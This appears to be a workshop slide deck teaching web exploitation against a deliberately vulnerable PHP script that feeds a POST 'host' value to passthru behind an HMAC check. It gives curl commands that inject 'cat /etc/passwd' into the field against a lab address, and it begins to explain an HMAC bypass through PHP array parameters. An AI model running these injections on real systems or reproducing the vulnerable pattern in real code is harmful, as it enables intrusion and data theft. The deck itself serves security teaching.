2022-02-03/Presentation.html
<section id="slide-org82e1658" data-background="../common/background.png">
<h3 id="org82e1658"><span class="section-number-3">7.4.</span> Source code: Authentication and execution</h3>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

</section>
<section id="slide-orgf6b13f6" data-background="../common/background.png">
<h3 id="orgf6b13f6"><span class="section-number-3">7.5.</span> Step 0: Identify host</h3>
<p class="fragment appear">
10.104.58.39
</p>

<p class="fragment appear">
Join in! <a href="http://10.104.58.39/ui.php" class="fragment appear">http://10.104.58.39/ui.php</a>
</p>

</section>
<section id="slide-org853c198" data-background="../common/background.png">
<h3 id="org853c198"><span class="section-number-3">7.6.</span> Step 1: Normal Usage</h3>
<p class="fragment fade-in-and-out">
What&rsquo;s &ldquo;normal&rdquo;?
</p>

</section>
<section id="slide-org966eef0" data-background="../common/background.png">
<h4 id="org966eef0"><span class="section-number-4">7.6.1.</span> Usage 1:</h4>
<ul>
<li>host: <code>google.com</code></li>
<li>hmac: <code>ad1663b82d5bdb2e1938...</code></li>

</ul>

</section>
<section id="slide-orgfab3848" data-background="../common/background.png">
<h4 id="orgfab3848"><span class="section-number-4">7.6.2.</span> Usage 2:</h4>
<ul>
<li>host: <code>google.com</code></li>
<li>nonce: <code>STUPID_NONCE</code></li>
<li>hmac: <code>b3700dedb181ee312930...</code></li>

</ul>

</section>
<section id="slide-orgd4e8c0e" data-background="../common/background.png">
<h4 id="orgd4e8c0e"><span class="section-number-4">7.6.3.</span> Command</h4>
<aside class="notes">
<p>
Execute command below:
</p>

<p>
<a href="curl --data "host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1">curl --data "host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1</a>
</p>

</aside>

<div class="org-src-container">

<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #98be65;">"host=google.com&amp;hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64"</span> 10.104.58.39
</code></pre>
</div>

</section>
<section id="slide-orgf04cfe3" data-background="../common/background.png">
<h3 id="orgf04cfe3"><span class="section-number-3">7.7.</span> What functions are being called and variables used?</h3>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim>    $<span style="color: #dcaeea;">secret</span> = getenv<span style="color: #51afef;">(</span><span style="color: #98be65;">"SECRET"</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">isset</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span>
        $<span style="color: #dcaeea;">secret</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'nonce'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    $<span style="color: #dcaeea;">hmac</span> = hash_hmac<span style="color: #51afef;">(</span><span style="color: #98be65;">'sha256'</span>, $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span>, $<span style="color: #dcaeea;">secret</span><span style="color: #51afef;">)</span>;

    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">hmac</span> !== $<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 403 Forbidden'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>

    <span style="color: #51afef;">echo</span> passthru<span style="color: #51afef;">(</span><span style="color: #98be65;">"host "</span>.$<span style="color: #dcaeea;">_POST</span><span style="color: #c678dd;">[</span><span style="color: #98be65;">'host'</span><span style="color: #c678dd;">]</span><span style="color: #51afef;">)</span>;
</code></pre>
</div>

<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.getenv.php"><code>getenv</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.isset.php"><code>isset</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/reserved.variables.post.php"><code>$_POST</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.hash-hmac.php"><code>hash_hmac</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.header.php"><code>header</code></a></li>

</ul>
<ul class="fragment appear">
<li><a href="https://www.php.net/manual/en/function.passthru.php"><code>passthru</code></a></li>

</ul>

</section>
<section id="slide-org6a9da56" data-background="../common/background.png">
<h3 id="org6a9da56"><span class="section-number-3">7.8.</span> Step 2: Bash Injection</h3>
<p>
Is <code>passthru</code> vulnerable to shell injections?
</p>
<p class="fragment appear">
Yes!
</p>

</section>
<section id="slide-orgb0d7b35" data-background="../common/background.png">
<h4 id="orgb0d7b35"><span class="section-number-4">7.8.1.</span> Example usage:</h4>
<ul>
<li>host: <code>google.com;cat /etc/passwd</code></li>
<li>hmac: <code>84e26d8e32086e127a60...</code></li>

</ul>

</section>
<section id="slide-orgb90f2a7" data-background="../common/background.png">
<h4 id="orgb90f2a7"><span class="section-number-4">7.8.2.</span> Command</h4>
<aside class="notes">
<p>
Execute command below:
</p>

<p>
<a href="curl --data "host=google.com;cat /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1">curl --data "host=google.com;cat /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1</a>
</p>

</aside>

<div class="org-src-container">

<pre  class="src src-bash"   ><code trim><span style="color: #ECBE7B;">curl</span> --data <span style="color: #98be65;">"host=google.com;</span><span style="color: #98be65;">cat</span><span style="color: #98be65;"> /etc/passwd&amp;hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417"</span> 10.104.58.39
</code></pre>
</div>

</section>
<section id="slide-orgc04f167" data-background="../common/background.png">
<h3 id="orgc04f167"><span class="section-number-3">7.9.</span> Step 3: HMAC Circumvention</h3>
<p>
What else is vulnerable in the code above?
</p>
<p class="fragment appear">
Is there anything magic that happens, a &ldquo;feature&rdquo;?
</p>

</section>
<section id="slide-org7bec867" data-background="../common/background.png">
<h4 id="org7bec867"><span class="section-number-4">7.9.1.</span> Did you catch it?</h4>
<p class="fragment appear">
&ldquo;One feature of PHP&rsquo;s processing of POST and GET variables is that it automatically decodes indexed form variable names.&rdquo;
</p>

<p class="fragment appear">
What does this do to the types of variables used?
</p>

</section>
<section id="slide-org4cb5693" data-background="../common/background.png">
<h4 id="org4cb5693"><span class="section-number-4">7.9.2.</span> Some PHP analysis</h4>
<ul class="fragment appear">
<li><code>element[]</code>: 1</li>
<li><code>element[]</code>: 2</li>

</ul>

<div class="org-src-container">

<pre  class="fragment appear"   ><code trim><span style="color: #51afef; font-weight: bold;">&lt;?php</span>
    var_dump<span style="color: #51afef;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #51afef;">)</span>;

    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">array(1) {</span>
    <span style="color: #5B6268;">//     </span><span style="color: #5B6268;">["element"] =&gt; array(2) {</span>
    <span style="color: #5B6268;">//         </span><span style="color: #5B6268;">[0] =&gt; string(1) "1"</span>
    <span style="color: #5B6268;">//         </span><span style="color: #5B6268;">[1] =&gt; string(2) "2"</span>
    <span style="color: #5B6268;">//     </span><span style="color: #5B6268;">}</span>
    <span style="color: #5B6268;">// </span><span style="color: #5B6268;">}</span>
</code></pre>
</div>

</section>
